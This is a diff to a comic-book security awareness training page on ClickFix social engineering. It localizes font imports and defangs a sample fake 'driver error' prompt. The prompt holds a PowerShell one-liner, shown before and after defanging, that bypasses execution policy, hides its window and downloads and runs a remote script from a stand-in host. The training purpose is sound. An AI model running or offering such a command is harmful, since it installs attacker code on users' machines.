@@ -7,7 +7,7 @@
   <meta name="description" content="Comic book security awareness training on ClickFix social engineering attacks. Issue #1 of the Dude Diligence series by Circle 6 Systems.">
 
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Bangers&family=Comic+Neue:ital,wght@0,300;0,400;0,700;1,400;1,700&display=swap');
+    @import url('../fonts/fonts.css');
 
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -1756,7 +1756,7 @@
             <div style="background:#fff3f3; border:1px solid #fcc; border-radius:4px; padding:0.75rem; font-family:Arial,sans-serif; font-size:0.82rem; margin-bottom:0.75rem;">
               Your display driver has encountered a critical error. To fix this issue, run the following command:<br><br>
               <code style="background:#1a1a1a; color:#4ec9b0; padding:0.3rem 0.5rem; display:block; border-radius:3px; font-size:0.75rem; word-break:break-all; margin-top:0.3rem;">
-                powershell -ep bypass -w hidden IEX(New-Object Net.WebClient).DownloadString('http://fix-driver.xyz/update.ps1')
+                powershell -ep bypass -w hidden IEX(New-Object Net.WebClient).DownloadString('http://fix-driver[.]xyz/update.ps1')
               </code>
             </div>
             <div style="font-family:Arial,sans-serif; font-size:0.82rem; text-align:center;">
@@ -2308,7 +2308,7 @@
       <head>
         <title>Dude Diligence Certificate</title>
         <style>
-          @import url('https://fonts.googleapis.com/css2?family=Bangers&family=Comic+Neue:wght@400;700&display=swap');
+          @import url('../fonts/fonts.css');
           body { font-family: 'Comic Neue', cursive; margin: 2rem; }
           .cert { border: 4px double #1a1a1a; padding: 3rem; text-align: center; max-width: 800px; margin: 0 auto; position: relative; }
           .cert::before { content:''; position:absolute; inset:8px; border:2px solid #1a1a1a; pointer-events:none; }
